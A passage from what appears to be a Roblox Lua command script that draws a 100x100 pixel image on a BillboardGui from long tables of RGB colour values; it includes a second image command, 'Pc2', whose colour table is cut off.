{0.984,0.957,0.871},{0.988,0.949,0.859},{1,0.953,0.859},{0.996,0.949,0.867},{0.992,0.949,0.867},{1,0.961,0.878},{1,0.957,0.871},{0.992,0.953,0.871},{0.996,0.953,0.89},{0.961,0.89,0.839},{0.957,0.859,0.804},{0.961,0.847,0.796},{0.957,0.839,0.769},{0.937,0.824,0.765},{0.933,0.82,0.757},{0.933,0.816,0.741},{0.925,0.808,0.733},{0.914,0.792,0.71},{0.918,0.788,0.702},{0.906,0.776,0.667},{0.894,0.757,0.631},{0.898,0.757,0.631},{0.886,0.725,0.592},{0.878,0.71,0.553},{0.871,0.733,0.525},{0.918,0.82,0.545},{0.969,0.898,0.518},{0.992,0.914,0.463},{0.976,0.902,0.384},{0.976,0.875,0.349},{0.957,0.82,0.282},{0.925,0.769,0.212},{0.89,0.698,0.149},{0.859,0.639,0.098},{0.839,0.584,0.067},{0.812,0.529,0.031},{0.792,0.494,0.02},{0.788,0.478,0.012},{0.796,0.498,0.008},{0.796,0.514,0.012},{0.8,0.533,0.016},{0.824,0.557,0.012},{0.839,0.584,0.012},{0.839,0.604,0.02},{0.851,0.612,0.02},{0.851,0.604,0.016},{0.831,0.58,0.008},{0.812,0.545,0.012},{0.792,0.51,0.008},{0.78,0.482,0.008},{0.78,0.498,0.008},{0.796,0.514,0.008},{0.784,0.502,0.008},
{0.78,0.494,0.008},{0.784,0.486,0.016},{0.8,0.514,0.02},{0.808,0.529,0.043},{0.812,0.549,0.055},{0.827,0.573,0.071},{0.835,0.596,0.086},{0.835,0.6,0.082},{0.847,0.616,0.102},{0.847,0.616,0.106},{0.855,0.631,0.118},{0.827,0.604,0.086},{0.847,0.62,0.086},{0.773,0.894,1},{0.773,0.894,1},{0.788,0.898,1},{0.788,0.894,1},{0.788,0.898,0.996},{0.792,0.902,0.996},{0.792,0.902,0.996},{0.804,0.902,1},{0.82,0.906,1},{0.82,0.906,1},{0.824,0.906,1},{0.824,0.902,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.922,1},{0.839,0.922,1},{0.847,0.922,0.992},{0.851,0.925,0.992},{0.859,0.925,0.996},{0.859,0.925,0.996},{0.859,0.925,0.992},{0.863,0.929,0.992},{0.902,0.941,0.965},{0.871,0.827,0.745},{0.937,0.918,0.851},{0.918,0.871,0.784},{0.871,0.796,0.678},{0.871,0.808,0.694},{0.988,0.965,0.867},{1,0.988,0.929},{1,0.98,0.914},{1,0.969,0.902},{0.992,0.965,0.886},{0.992,0.953,0.867},{0.992,0.945,0.855},{1,0.957,0.871},{0.996,0.957,0.878},{1,0.965,0.89},
{1,0.965,0.886},{1,0.961,0.882},{1,0.965,0.886},{0.996,0.953,0.878},{0.969,0.894,0.824},{0.957,0.867,0.816},{0.961,0.855,0.792},{0.953,0.839,0.784},{0.945,0.831,0.773},{0.937,0.824,0.761},{0.937,0.82,0.757},{0.929,0.812,0.741},{0.925,0.804,0.729},{0.918,0.788,0.702},{0.91,0.78,0.678},{0.902,0.769,0.659},{0.886,0.753,0.627},{0.89,0.741,0.612},{0.875,0.706,0.569},{0.867,0.698,0.533},{0.843,0.686,0.478},{0.859,0.698,0.494},{0.894,0.753,0.49},{0.925,0.816,0.486},{0.957,0.871,0.494},{0.98,0.902,0.482},{0.996,0.906,0.463},{0.992,0.886,0.404},{0.98,0.859,0.365},{0.969,0.831,0.298},{0.937,0.808,0.231},{0.922,0.773,0.208},{0.91,0.749,0.161},{0.906,0.741,0.153},{0.91,0.745,0.149},{0.906,0.737,0.118},{0.914,0.749,0.114},{0.925,0.753,0.118},{0.922,0.737,0.098},{0.914,0.733,0.086},{0.929,0.749,0.102},{0.918,0.745,0.098},{0.925,0.733,0.098},{0.902,0.698,0.059},{0.886,0.671,0.024},{0.886,0.667,0.024},{0.906,0.686,0.043},{0.89,0.667,0.039},{0.871,0.631,0.02},{0.859,0.616,0.012},{0.847,0.596,0.012},{0.847,0.588,0.008},{0.835,0.573,0.004},
{0.831,0.569,0.004},{0.831,0.573,0.004},{0.835,0.573,0.004},{0.839,0.576,0.004},{0.827,0.584,0.004},{0.824,0.588,0.004},{0.831,0.588,0.004},{0.773,0.894,1},{0.773,0.894,1},{0.788,0.898,1},{0.788,0.894,1},{0.796,0.906,1},{0.792,0.902,0.996},{0.792,0.902,1},{0.804,0.902,1},{0.816,0.902,0.996},{0.82,0.906,1},{0.824,0.906,1},{0.824,0.906,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.922,1},{0.839,0.918,1},{0.847,0.922,0.992},{0.847,0.922,0.992},{0.855,0.922,0.992},{0.859,0.925,0.996},{0.859,0.925,0.992},{0.863,0.929,0.992},{0.902,0.937,0.933},{0.878,0.839,0.753},{0.941,0.925,0.859},{0.898,0.855,0.753},{0.851,0.776,0.655},{0.878,0.82,0.702},{0.996,0.973,0.875},{1,0.988,0.929},{1,0.98,0.914},{0.988,0.965,0.871},{0.996,0.969,0.89},{1,0.965,0.89},{0.996,0.953,0.867},{1,0.957,0.871},{1,0.961,0.878},{1,0.969,0.894},{0.996,0.957,0.89},{1,0.953,0.89},{1,0.957,0.886},{0.996,0.961,0.867},{0.973,0.937,0.843},{0.925,0.867,0.82},
{0.941,0.863,0.808},{0.953,0.855,0.792},{0.953,0.847,0.788},{0.957,0.835,0.788},{0.945,0.827,0.776},{0.933,0.82,0.761},{0.933,0.816,0.757},{0.922,0.808,0.737},{0.914,0.8,0.714},{0.906,0.78,0.69},{0.898,0.769,0.663},{0.902,0.761,0.659},{0.89,0.737,0.627},{0.878,0.722,0.6},{0.875,0.698,0.565},{0.843,0.682,0.522},{0.835,0.659,0.49},{0.824,0.639,0.463},{0.808,0.624,0.416},{0.808,0.616,0.4},{0.804,0.635,0.384},{0.82,0.655,0.384},{0.843,0.671,0.388},{0.867,0.714,0.384},{0.89,0.741,0.392},{0.906,0.757,0.376},{0.945,0.792,0.384},{0.957,0.82,0.369},{0.973,0.843,0.361},{0.969,0.847,0.341},{0.961,0.843,0.322},{0.969,0.847,0.31},{0.965,0.831,0.286},{0.957,0.835,0.263},{0.953,0.831,0.255},{0.941,0.824,0.231},{0.957,0.827,0.231},{0.957,0.816,0.216},{0.945,0.808,0.192},{0.933,0.784,0.161},{0.918,0.765,0.137},{0.929,0.788,0.157},{0.929,0.773,0.149},{0.922,0.765,0.141},{0.918,0.753,0.129},{0.902,0.729,0.106},{0.894,0.722,0.094},{0.89,0.71,0.086},{0.878,0.69,0.071},{0.859,0.675,0.047},{0.863,0.678,0.047},{0.867,0.69,0.055},{0.855,0.682,0.047},
{0.863,0.686,0.051},{0.776,0.898,1},{0.776,0.898,1},{0.776,0.898,1},{0.776,0.894,1},{0.788,0.898,0.996},{0.792,0.902,0.996},{0.792,0.902,0.996},{0.796,0.906,1},{0.8,0.902,1},{0.816,0.902,1},{0.82,0.906,1},{0.824,0.91,1},{0.82,0.902,1},{0.82,0.906,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.827,0.914,1},{0.831,0.929,1},{0.843,0.925,1},{0.851,0.922,0.996},{0.851,0.925,0.992},{0.847,0.929,0.996},{0.847,0.933,0.992},{0.91,0.914,0.91},{0.894,0.843,0.776},{0.953,0.918,0.871},{0.894,0.843,0.741},{0.839,0.773,0.643},{0.902,0.839,0.706},{0.996,0.976,0.894},{1,0.984,0.933},{0.996,0.976,0.894},{0.996,0.961,0.851},{0.996,0.945,0.871},{1,0.965,0.89},{0.996,0.965,0.886},{0.992,0.961,0.886},{0.992,0.961,0.886},{1,0.969,0.894},{0.992,0.961,0.886},{0.992,0.961,0.882},{0.996,0.961,0.886},{0.996,0.953,0.859},{0.976,0.941,0.863},{0.867,0.831,0.753},{0.871,0.816,0.745},{0.937,0.851,0.78},{0.949,0.847,0.784},{0.953,0.839,0.792},{0.945,0.835,0.776},{0.945,0.831,0.776},
{0.941,0.824,0.773},{0.933,0.816,0.773},{0.925,0.808,0.753},{0.922,0.796,0.714},{0.914,0.784,0.694},{0.914,0.773,0.678},{0.902,0.765,0.655},{0.89,0.745,0.631},{0.878,0.714,0.604},{0.855,0.706,0.569},{0.843,0.69,0.557},{0.843,0.675,0.529},{0.827,0.663,0.498},{0.82,0.651,0.486},{0.804,0.627,0.451},{0.796,0.608,0.427},{0.788,0.6,0.416},{0.784,0.58,0.388},{0.765,0.565,0.369},{0.749,0.541,0.333},{0.729,0.506,0.302},{0.722,0.506,0.286},{0.729,0.514,0.294},{0.733,0.533,0.275},{0.757,0.561,0.271},{0.784,0.612,0.294},{0.812,0.647,0.298},{0.835,0.675,0.306},{0.871,0.714,0.298},{0.898,0.757,0.306},{0.922,0.788,0.298},{0.941,0.812,0.31},{0.957,0.831,0.322},{0.969,0.843,0.314},{0.957,0.82,0.259},{0.945,0.808,0.216},{0.957,0.831,0.239},{0.957,0.839,0.247},{0.945,0.831,0.239},{0.945,0.824,0.231},{0.929,0.812,0.208},{0.929,0.808,0.208},{0.918,0.8,0.192},{0.914,0.788,0.173},{0.906,0.78,0.165},{0.906,0.776,0.165},{0.89,0.757,0.165},{0.902,0.769,0.157},{0.773,0.894,1},{0.773,0.894,1},{0.773,0.894,1},{0.776,0.902,1},{0.788,0.898,0.996},
{0.792,0.902,0.996},{0.792,0.902,0.996},{0.792,0.902,0.996},{0.8,0.898,1},{0.812,0.898,0.996},{0.824,0.906,1},{0.824,0.91,1},{0.824,0.906,1},{0.824,0.902,1},{0.827,0.906,1},{0.827,0.906,1},{0.827,0.914,1},{0.827,0.914,1},{0.827,0.925,1},{0.839,0.922,1},{0.847,0.922,0.992},{0.851,0.925,0.992},{0.855,0.922,0.992},{0.855,0.929,0.992},{0.91,0.898,0.882},{0.914,0.871,0.788},{0.949,0.922,0.875},{0.886,0.835,0.733},{0.839,0.773,0.639},{0.918,0.851,0.718},{0.996,0.973,0.886},{0.996,0.984,0.918},{0.992,0.976,0.886},{0.988,0.953,0.843},{0.996,0.945,0.871},{0.996,0.957,0.886},{0.996,0.965,0.89},{0.988,0.957,0.882},{0.992,0.961,0.886},{1,0.969,0.894},{0.996,0.965,0.89},{0.992,0.961,0.886},{0.996,0.961,0.886},{0.992,0.949,0.855},{0.961,0.925,0.847},{0.855,0.816,0.741},{0.882,0.831,0.761},{0.741,0.671,0.584},{0.827,0.737,0.69},{0.937,0.824,0.776},{0.945,0.831,0.776},{0.941,0.827,0.773},{0.941,0.824,0.773},{0.941,0.82,0.776},{0.941,0.82,0.773},{0.937,0.812,0.741},{0.933,0.804,0.725},{0.918,0.788,0.702},
{0.906,0.78,0.678},{0.902,0.761,0.655},{0.886,0.737,0.635},{0.871,0.722,0.6},{0.863,0.71,0.592},{0.855,0.694,0.576},{0.839,0.678,0.549},{0.831,0.671,0.537},{0.816,0.643,0.498},{0.808,0.635,0.502},{0.796,0.627,0.49},{0.792,0.612,0.463},{0.776,0.596,0.451},{0.765,0.58,0.431},{0.741,0.545,0.4},{0.698,0.49,0.337},{0.733,0.525,0.373},{0.733,0.522,0.357},{0.725,0.514,0.341},{0.725,0.514,0.337},{0.718,0.51,0.322},{0.702,0.494,0.302},{0.682,0.478,0.263},{0.655,0.459,0.235},{0.651,0.455,0.231},{0.659,0.463,0.239},{0.667,0.478,0.216},{0.675,0.502,0.208},{0.706,0.533,0.204},{0.753,0.58,0.204},{0.804,0.655,0.22},{0.859,0.725,0.243},{0.875,0.741,0.247},{0.902,0.773,0.239},{0.914,0.784,0.227},{0.91,0.78,0.227},{0.91,0.78,0.22},{0.906,0.784,0.212},{0.902,0.78,0.208},{0.902,0.776,0.208},{0.894,0.773,0.216},{0.878,0.765,0.188}}
Width = 100
Height = 100
scale = 2
StarterCFrame = CFrame.new(30,5,0)
p = Instance.new("Part",workspace)
p.CFrame = StarterCFrame
p.Anchored = true
p.Transparency = 1
p.CanCollide = false
p.Name = "Swag"
m = Instance.new("BillboardGui")
m.Parent = p
m.Adornee = p
m.Size = UDim2.new(0,100*scale,0,100*scale)
m.AlwaysOnTop = true
i = 0
for x=1,Height do
for y=1,Width do
i=i+1
b = Instance.new("Frame") --- less laggy o3o
b.Size = UDim2.new(0,scale,0,scale)
coroutine.resume(coroutine.create(function()
b.Position = UDim2.new(0,x*scale,0,y*scale) --- pixel movement o3o
b.Parent = m
b.BorderSizePixel = 0
b.BackgroundColor3 = Color3.new(Values[i][1],Values[i][2],Values[i][3])
end))
end
wait(0.04)
end
	
end)
Command("Pc2", 4, "You'll see", function(Msg, Speaker)
Values = {{0.694,0.592,0.608},{0.694,0.592,0.608},{0.686,0.58,0.596},{0.698,0.596,0.608},{0.69,0.584,0.6},{0.69,0.58,0.596},{0.69,0.584,0.6},{0.702,0.6,0.612},{0.714,0.616,0.627},{0.714,0.62,0.631},{0.714,0.612,0.624},{0.718,0.624,0.635},{0.729,0.635,0.647},{0.729,0.631,0.643},{0.725,0.631,0.639},{0.722,0.624,0.635},{0.706,0.608,0.62},{0.694,0.592,0.604},{0.702,0.6,0.616},{0.718,0.624,0.635},{0.749,0.659,0.671},{0.749,0.663,0.671},{0.737,0.643,0.655},{0.749,0.663,0.675},{0.757,0.663,0.675},{0.753,0.667,0.675},{0.757,0.663,0.675},{0.769,0.675,0.686},{0.788,0.698,0.71},{0.796,0.702,0.714},{0.804,0.718,0.729},{0.812,0.718,0.729},{0.8,0.698,0.706},{0.753,0.533,0.42},{0.769,0.533,0.4},{0.784,0.553,0.416},{0.792,0.549,0.412},{0.8,0.557,0.42},{0.796,0.553,0.408},{0.788,0.541,0.4},{0.78,0.537,0.396},{0.773,0.522,0.384},{0.757,0.506,0.369},{0.741,0.49,0.353},{0.729,0.478,0.341},{0.722,0.467,0.337},{0.71,0.455,0.322},{0.69,0.435,0.298},{0.671,0.408,0.278},{0.655,0.388,0.259},{0.639,0.376,0.251},{0.627,0.369,0.243},{0.612,0.349,0.224},
{0.6,0.337,0.224},{0.584,0.325,0.208},{0.58,0.322,0.208},{0.569,0.31,0.192},{0.565,0.31,0.192},{0.549,0.29,0.176},{0.541,0.282,0.173},{0.533,0.275,0.169},{0.518,0.263,0.157},{0.514,0.259,0.153},{0.502,0.247,0.145},{0.502,0.251,0.145},{0.506,0.247,0.145},{0.502,0.247,0.145},{0.498,0.239,0.137},{0.502,0.247,0.145},{0.494,0.235,0.137},{0.502,0.247,0.145},{0.498,0.243,0.141},{0.498,0.239,0.141},{0.498,0.239,0.137},{0.486,0.235,0.133},{0.494,0.235,0.133},{0.49,0.235,0.133},{0.49,0.231,0.129},{0.478,0.224,0.129},{0.467,0.212,0.118},{0.471,0.22,0.125},{0.451,0.196,0.114},{0.435,0.18,0.102},{0.431,0.176,0.098},{0.408,0.161,0.09},{0.4,0.153,0.082},{0.4,0.153,0.082},{0.388,0.149,0.078},{0.388,0.145,0.075},{0.392,0.149,0.082},{0.396,0.157,0.086},{0.392,0.153,0.082},{0.4,0.161,0.09},{0.396,0.161,0.09},{0.396,0.161,0.09},{0.4,0.161,0.094},{0.396,0.161,0.09},{0.384,0.153,0.09},{0.365,0.141,0.075},{0.337,0.129,0.067},{0.655,0.541,0.557},{0.655,0.541,0.557},{0.643,0.522,0.541},{0.643,0.525,0.541},{0.639,0.525,0.541},{0.639,0.522,0.541},
{0.635,0.514,0.533},{0.631,0.518,0.533},{0.631,0.514,0.533},{0.643,0.525,0.545},{0.651,0.533,0.553},{0.663,0.549,0.565},{0.694,0.588,0.604},{0.69,0.584,0.596},{0.686,0.58,0.592},{0.69,0.584,0.596},{0.69,0.584,0.596},{0.678,0.565,0.58},{0.69,0.584,0.596},{0.694,0.592,0.604},{0.698,0.6,0.612},{0.71,0.608,0.624},{0.702,0.604,0.616},{0.71,0.612,0.624},{0.718,0.624,0.635},{0.722,0.627,0.639},{0.729,0.635,0.647},{0.729,0.635,0.643},{0.737,0.639,0.651},{0.745,0.655,0.663},{0.765,0.667,0.678},{0.765,0.671,0.682},{0.769,0.678,0.69},{0.753,0.62,0.588},{0.769,0.537,0.408},{0.788,0.553,0.424},{0.804,0.573,0.431},{0.808,0.569,0.427},{0.812,0.569,0.427},{0.8,0.557,0.412},{0.792,0.545,0.408},{0.78,0.533,0.392},{0.776,0.525,0.384},{0.765,0.522,0.38},{0.753,0.502,0.365},{0.729,0.475,0.337},{0.718,0.463,0.325},{0.698,0.439,0.306},{0.678,0.42,0.286},{0.675,0.408,0.278},{0.655,0.392,0.259},{0.631,0.373,0.243},{0.62,0.361,0.235},{0.604,0.345,0.22},{0.604,0.341,0.224},{0.592,0.329,0.216},{0.58,0.322,0.204},{0.58,0.318,0.204},{0.557,0.298,0.184},
{0.549,0.298,0.18},{0.545,0.29,0.176},{0.533,0.278,0.173},{0.525,0.267,0.165},{0.514,0.263,0.157},{0.514,0.259,0.153},{0.518,0.263,0.153},{0.518,0.259,0.153},{0.522,0.263,0.153},{0.518,0.259,0.157},{0.518,0.263,0.157},{0.514,0.259,0.153},{0.518,0.259,0.153},{0.518,0.259,0.153},{0.514,0.259,0.149},{0.51,0.255,0.145},{0.502,0.243,0.137},{0.498,0.243,0.137},{0.494,0.235,0.133},{0.49,0.235,0.129},{0.482,0.227,0.125},{0.482,0.227,0.129},{0.467,0.212,0.122},{0.451,0.196,0.114},{0.435,0.18,0.102},{0.42,0.165,0.094},{0.42,0.169,0.098},{0.42,0.169,0.098},{0.412,0.165,0.09},{0.408,0.161,0.09},{0.412,0.161,0.094},{0.408,0.165,0.094},{0.408,0.161,0.094},{0.412,0.173,0.102},{0.412,0.173,0.102},{0.416,0.173,0.102},{0.412,0.173,0.102},{0.408,0.169,0.098},{0.4,0.161,0.09},{0.376,0.149,0.082},{0.349,0.129,0.067},{0.616,0.498,0.514},{0.616,0.498,0.514},{0.608,0.486,0.506},{0.604,0.482,0.502},{0.6,0.478,0.498},{0.596,0.475,0.498},{0.604,0.482,0.502},{0.604,0.482,0.502},{0.6,0.478,0.498},{0.596,0.475,0.494},{0.6,0.478,0.498},{0.612,0.494,0.514},
{0.627,0.514,0.529},{0.635,0.522,0.537},{0.643,0.529,0.545},{0.647,0.533,0.545},{0.651,0.537,0.549},{0.639,0.525,0.537},{0.616,0.506,0.518},{0.62,0.502,0.51},{0.624,0.514,0.522},{0.627,0.514,0.525},{0.631,0.518,0.525},{0.639,0.525,0.537},{0.651,0.541,0.553},{0.659,0.549,0.561},{0.667,0.557,0.565},{0.675,0.573,0.584},{0.686,0.576,0.588},{0.686,0.576,0.588},{0.69,0.592,0.604},{0.706,0.604,0.616},{0.714,0.616,0.627},{0.729,0.631,0.643},{0.737,0.557,0.478},{0.788,0.557,0.424},{0.812,0.584,0.447},{0.82,0.584,0.447},{0.816,0.58,0.435},{0.812,0.576,0.431},{0.804,0.561,0.424},{0.796,0.549,0.408},{0.784,0.537,0.396},{0.769,0.522,0.38},{0.765,0.518,0.38},{0.749,0.494,0.357},{0.733,0.478,0.341},{0.722,0.471,0.337},{0.694,0.435,0.302},{0.686,0.424,0.29},{0.675,0.412,0.282},{0.655,0.396,0.271},{0.627,0.369,0.243},{0.624,0.365,0.243},{0.604,0.341,0.22},{0.604,0.341,0.22},{0.592,0.329,0.212},{0.58,0.322,0.204},{0.565,0.306,0.188},{0.557,0.302,0.184},{0.553,0.302,0.184},{0.549,0.294,0.18},{0.545,0.286,0.176},{0.541,0.282,0.176},{0.537,0.278,0.169},
{0.541,0.282,0.169},{0.537,0.278,0.169},{0.533,0.278,0.169},{0.537,0.286,0.173},{0.529,0.278,0.169},{0.525,0.271,0.161},{0.522,0.263,0.157},{0.522,0.267,0.157},{0.522,0.267,0.161},{0.51,0.251,0.149},{0.506,0.251,0.145},{0.506,0.247,0.141},{0.502,0.243,0.141},{0.502,0.243,0.137},{0.494,0.239,0.133},{0.49,0.235,0.133},{0.478,0.224,0.129},{0.463,0.204,0.118},{0.459,0.2,0.114},{0.451,0.192,0.11},{0.443,0.184,0.102},{0.435,0.18,0.098},{0.435,0.176,0.102},{0.435,0.18,0.102},{0.439,0.184,0.11},{0.431,0.18,0.106},{0.431,0.176,0.102},{0.427,0.18,0.106},{0.424,0.176,0.106},{0.424,0.176,0.106},{0.412,0.169,0.098},{0.408,0.169,0.098},{0.404,0.165,0.094},{0.384,0.153,0.09},{0.365,0.141,0.075},{0.612,0.494,0.51},{0.612,0.494,0.51},{0.596,0.475,0.494},{0.592,0.471,0.49},{0.58,0.459,0.478},{0.573,0.455,0.475},{0.573,0.455,0.475},{0.569,0.451,0.471},{0.565,0.447,0.467},{0.561,0.443,0.463},{0.561,0.443,0.459},{0.553,0.439,0.455},{0.573,0.455,0.475},{0.592,0.475,0.486},{0.6,0.486,0.494},{0.612,0.498,0.506},{0.608,0.498,0.502},{0.596,0.482,0.49},
{0.576,0.467,0.471},{0.561,0.443,0.451},{0.545,0.431,0.439},{0.549,0.431,0.439},{0.561,0.443,0.451},{0.561,0.447,0.451},{0.561,0.447,0.451},{0.561,0.447,0.451},{0.557,0.443,0.447},{0.557,0.447,0.451},{0.569,0.455,0.459},{0.573,0.459,0.459},{0.58,0.467,0.475},{0.596,0.482,0.486},{0.62,0.502,0.51},{0.631,0.518,0.525},{0.651,0.529,0.525},{0.749,0.529,0.416},{0.808,0.576,0.447},{0.824,0.596,0.459},{0.82,0.584,0.447},{0.82,0.584,0.443},{0.816,0.576,0.435},{0.804,0.561,0.42},{0.8,0.557,0.416},{0.784,0.537,0.396},{0.773,0.525,0.388},{0.757,0.506,0.369},{0.749,0.498,0.361},{0.729,0.475,0.337},{0.714,0.451,0.322},{0.702,0.451,0.318},{0.682,0.427,0.294},{0.667,0.408,0.278},{0.655,0.388,0.263},{0.639,0.376,0.247},{0.62,0.353,0.227},{0.608,0.345,0.22},{0.604,0.341,0.22},{0.596,0.337,0.212},{0.584,0.318,0.2},{0.58,0.314,0.196},{0.569,0.306,0.188},{0.553,0.29,0.176},{0.557,0.298,0.184},{0.553,0.298,0.184},{0.561,0.302,0.188},{0.557,0.298,0.184},{0.553,0.294,0.176},{0.549,0.294,0.176},{0.541,0.286,0.176},{0.529,0.271,0.161},{0.522,0.267,0.161},
{0.514,0.255,0.153},{0.502,0.247,0.141},{0.498,0.239,0.137},{0.49,0.235,0.133},{0.494,0.239,0.137},{0.486,0.231,0.129},{0.494,0.239,0.133},{0.49,0.235,0.129},{0.486,0.231,0.125},{0.478,0.227,0.129},{0.478,0.227,0.137},{0.471,0.216,0.129},{0.463,0.208,0.125},{0.459,0.204,0.118},{0.459,0.204,0.122},{0.455,0.196,0.114},{0.451,0.196,0.11},{0.455,0.196,0.114},{0.459,0.2,0.122},{0.455,0.2,0.114},{0.451,0.196,0.118},{0.447,0.192,0.114},{0.443,0.184,0.114},{0.431,0.18,0.11},{0.42,0.176,0.106},{0.42,0.176,0.102},{0.408,0.169,0.098},{0.4,0.161,0.094},{0.38,0.149,0.086},{0.62,0.498,0.518},{0.62,0.498,0.518},{0.612,0.494,0.51},{0.6,0.478,0.498},{0.584,0.463,0.482},{0.565,0.447,0.463},{0.553,0.439,0.451},{0.537,0.42,0.439},{0.525,0.404,0.424},{0.498,0.376,0.396},{0.494,0.376,0.392},{0.49,0.373,0.388},{0.494,0.376,0.392},{0.502,0.388,0.404},{0.506,0.388,0.4},{0.498,0.384,0.392},{0.498,0.384,0.392},{0.51,0.396,0.396},{0.502,0.388,0.388},{0.478,0.365,0.361},{0.467,0.349,0.353},{0.451,0.333,0.325},{0.439,0.322,0.314},{0.427,0.31,0.302},
{0.427,0.31,0.302},{0.42,0.306,0.294},{0.412,0.294,0.286},{0.408,0.29,0.282},{0.404,0.286,0.278},{0.4,0.286,0.275},{0.412,0.298,0.286},{0.435,0.318,0.314},{0.459,0.341,0.337},{0.482,0.369,0.365},{0.522,0.404,0.396},{0.58,0.435,0.404},{0.78,0.549,0.427},{0.816,0.596,0.463},{0.824,0.592,0.455},{0.824,0.592,0.455},{0.816,0.58,0.439},{0.816,0.58,0.439},{0.808,0.569,0.427},{0.8,0.557,0.416},{0.784,0.537,0.396},{0.776,0.522,0.384},{0.765,0.514,0.376},{0.749,0.494,0.361},{0.733,0.486,0.349},{0.71,0.455,0.318},{0.698,0.443,0.31},{0.69,0.431,0.298},{0.667,0.404,0.275},{0.663,0.396,0.271},{0.647,0.384,0.255},{0.627,0.361,0.235},{0.627,0.357,0.235},{0.608,0.341,0.22},{0.6,0.333,0.212},{0.588,0.318,0.2},{0.584,0.318,0.2},{0.592,0.329,0.212},{0.584,0.314,0.196},{0.58,0.318,0.192},{0.58,0.318,0.2},{0.565,0.306,0.188},{0.557,0.298,0.18},{0.545,0.29,0.176},{0.522,0.267,0.161},{0.498,0.243,0.145},{0.486,0.235,0.133},{0.475,0.224,0.129},{0.451,0.204,0.11},{0.443,0.192,0.106},{0.431,0.18,0.098},{0.439,0.188,0.098},{0.451,0.196,0.106},
{0.451,0.196,0.106},{0.459,0.204,0.114},{0.463,0.212,0.118},{0.463,0.212,0.125},{0.463,0.208,0.125},{0.467,0.212,0.125},{0.471,0.216,0.129},{0.471,0.22,0.137},{0.463,0.208,0.118},{0.459,0.204,0.118},{0.463,0.204,0.114},{0.467,0.208,0.118},{0.467,0.212,0.133},{0.475,0.22,0.141},{0.475,0.22,0.141},{0.459,0.204,0.129},{0.451,0.192,0.122},{0.451,0.196,0.122},{0.443,0.192,0.118},{0.435,0.184,0.114},{0.424,0.18,0.11},{0.404,0.165,0.094},{0.392,0.149,0.086},{0.596,0.478,0.494},{0.596,0.478,0.494},{0.588,0.471,0.482},{0.584,0.467,0.482},{0.569,0.447,0.463},{0.557,0.439,0.455},{0.541,0.427,0.443},{0.537,0.424,0.439},{0.518,0.4,0.416},{0.49,0.373,0.388},{0.467,0.345,0.365},{0.447,0.329,0.341},{0.424,0.306,0.322},{0.404,0.286,0.302},{0.388,0.275,0.278},{0.384,0.267,0.275},{0.373,0.259,0.263},{0.369,0.251,0.247},{0.376,0.259,0.251},{0.365,0.247,0.239},{0.337,0.224,0.216},{0.302,0.192,0.18},{0.275,0.165,0.149},{0.267,0.161,0.141},{0.247,0.137,0.122},{0.239,0.129,0.114},{0.235,0.122,0.106},{0.227,0.118,0.102},{0.235,0.125,0.11},{0.243,0.129,0.114},
{0.247,0.133,0.118},{0.247,0.137,0.122},{0.271,0.157,0.145},{0.31,0.196,0.18},{0.357,0.239,0.227},{0.408,0.29,0.282},{0.569,0.4,0.341},{0.804,0.576,0.447},{0.82,0.592,0.459},{0.824,0.596,0.463},{0.824,0.592,0.451},{0.82,0.584,0.447},{0.82,0.58,0.443},{0.812,0.573,0.431},{0.8,0.557,0.412},{0.784,0.537,0.396},{0.776,0.529,0.392},{0.761,0.51,0.369},{0.745,0.498,0.361},{0.729,0.475,0.337},{0.714,0.459,0.322},{0.698,0.439,0.306},{0.682,0.416,0.286},{0.671,0.408,0.278},{0.663,0.396,0.271},{0.655,0.388,0.263},{0.635,0.369,0.239},{0.627,0.365,0.235},{0.62,0.349,0.224},{0.612,0.345,0.224},{0.612,0.345,0.224},{0.608,0.337,0.216},{0.612,0.341,0.22},{0.596,0.325,0.204},{0.576,0.314,0.192},{0.553,0.294,0.18},{0.525,0.267,0.161},{0.482,0.231,0.137},{0.447,0.2,0.11},{0.427,0.18,0.098},{0.4,0.153,0.075},{0.373,0.141,0.067},{0.353,0.122,0.047},{0.337,0.106,0.039},{0.333,0.106,0.039},{0.333,0.102,0.039},{0.329,0.106,0.039},{0.314,0.09,0.027},{0.322,0.102,0.039},{0.376,0.157,0.075},{0.427,0.188,0.106},{0.455,0.208,0.122},{0.471,0.216,0.133},
{0.478,0.224,0.137},{0.49,0.235,0.145},{0.482,0.224,0.137},{0.49,0.231,0.137},{0.494,0.235,0.137},{0.49,0.235,0.145},{0.494,0.239,0.153},{0.494,0.235,0.153},{0.486,0.231,0.145},{0.471,0.22,0.145},{0.467,0.212,0.133},{0.459,0.204,0.129},{0.447,0.196,0.125},{0.447,0.192,0.122},{0.431,0.184,0.11},{0.412,0.169,0.102},{0.396,0.157,0.09},{0.494,0.376,0.384},{0.494,0.376,0.384},{0.506,0.392,0.396},{0.502,0.388,0.392},{0.51,0.396,0.404},{0.514,0.396,0.404},{0.502,0.384,0.396},{0.502,0.384,0.392},{0.494,0.376,0.384},{0.478,0.365,0.376},{0.451,0.341,0.345},{0.42,0.306,0.31},{0.396,0.286,0.286},{0.365,0.247,0.255},{0.322,0.212,0.216},{0.294,0.184,0.184},{0.267,0.165,0.157},{0.251,0.149,0.133},{0.224,0.133,0.114},{0.204,0.106,0.09},{0.18,0.094,0.071},{0.173,0.078,0.059},{0.161,0.067,0.043},{0.153,0.055,0.035},{0.141,0.047,0.024},{0.137,0.039,0.02},{0.133,0.039,0.02},{0.137,0.039,0.016},{0.137,0.039,0.02},{0.153,0.047,0.027},{0.161,0.051,0.031},{0.153,0.051,0.027},{0.161,0.059,0.035},{0.18,0.075,0.055},{0.208,0.102,0.082},{0.251,0.141,0.125},
